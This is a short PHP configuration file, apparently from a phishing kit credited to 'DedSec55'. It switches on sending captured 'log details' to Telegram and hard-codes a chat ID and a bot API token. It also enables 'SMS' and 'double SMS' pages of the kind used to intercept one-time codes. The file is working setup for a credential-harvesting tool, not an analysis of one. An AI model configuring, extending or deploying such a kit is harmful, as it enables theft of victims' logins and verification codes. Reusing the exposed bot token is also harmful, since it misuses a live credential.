<?php
/*
8888888b.              888 .d8888b.                 888888888 888888888  
888  "Y88b             888d88P  Y88b                888       888        
888    888             888Y88b.                     888       888        
888    888 .d88b.  .d88888 "Y888b.   .d88b.  .d8888b8888888b. 8888888b.  
888    888d8P  Y8bd88" 888    "Y88b.d8P  Y8bd88P"        "Y88b     "Y88b 
888    88888888888888  888      "88888888888888            888       888 
888  .d88PY8b.    Y88b 888Y88b  d88PY8b.    Y88b.   Y88b  d88PY88b  d88P 
8888888P"  "Y8888  "Y88888 "Y8888P"  "Y8888  "Y8888P "Y8888P"  "Y8888P"  
Coded By DedSec55
DM:@DedSec55
*/
#Generate Random Numbers
$str=rand();
$randString = md5($str);

#Send Log Details to Telegram
$telegram = "on";
#Send Log Details to Discord
$discord = "off";
#Send Log Details to email
$email= "off";
// Your Telegram Chat ID
$chat_id = "1707231586"; 
//Your Telegram Bot Api Key
$bot_url = "bot5002304693:AAH4tLASOUgscFd3O3t7kDdTZus3P1vXSA4"; 
//Your Email here
$Bullet = "";
//SMS Page Enable Or Disable By Switching on/off
$smspage = "on";
//Double SMS Page Enable Or Disable By Switching on/off
$double_sms = "on";
?>